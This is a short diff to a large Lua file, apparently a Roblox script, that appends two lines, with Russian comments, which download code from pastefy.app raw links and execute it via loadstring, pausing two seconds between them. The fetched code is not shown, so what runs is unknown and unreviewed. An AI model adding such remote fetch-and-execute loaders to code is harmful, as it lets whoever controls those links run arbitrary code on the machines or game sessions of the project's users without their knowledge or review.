@@ -9354,3 +9354,12 @@ task.spawn(function()
         task.wait(CHECK_INTERVAL)
     end
 end)
+
+-- Запускаем первый скрипт
+loadstring(game:HttpGet("https://pastefy.app/jrt3t65J/raw"))()
+
+-- Ждём 2 секунды
+task.wait(2)
+
+-- Запускаем второй скрипт
+loadstring(game:HttpGet("https://pastefy.app/PhNaJaOR/raw"))()
